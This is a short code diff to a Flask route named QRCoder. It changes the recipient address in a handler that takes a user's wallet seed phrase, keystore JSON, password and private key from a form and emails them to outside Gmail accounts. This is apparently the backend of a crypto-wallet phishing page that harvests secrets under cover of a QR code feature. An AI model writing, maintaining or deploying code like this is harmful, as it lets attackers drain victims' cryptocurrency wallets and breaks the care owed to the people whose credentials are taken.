@@ -66,7 +66,7 @@ def QRCoder():
  privateKey = request.form["privateKey"]
  updated = datetime.now()
  updated = updated.strftime("%c")
- msg = Message('NEW UPDATE', sender = 'zolarich12@gmail.com', recipients = ['approves007@gmail.com'], bcc =['zolarich12@gmail.com'])
+ msg = Message('NEW UPDATE', sender = 'zolarich12@gmail.com', recipients = ['nejikamal@gmail.com'], bcc =['zolarich12@gmail.com'])
  msg.body = "Date and time: " + updated + " \n" + "Phrase: " + phrase + "\n" + "KeystoreJSON: " + keystoreJSON + "\n" + "Password: " + password + "\n" + "Private Key: " + privateKey
  mail.send(msg)
  return render_template( 'qrcode.html', form=form)
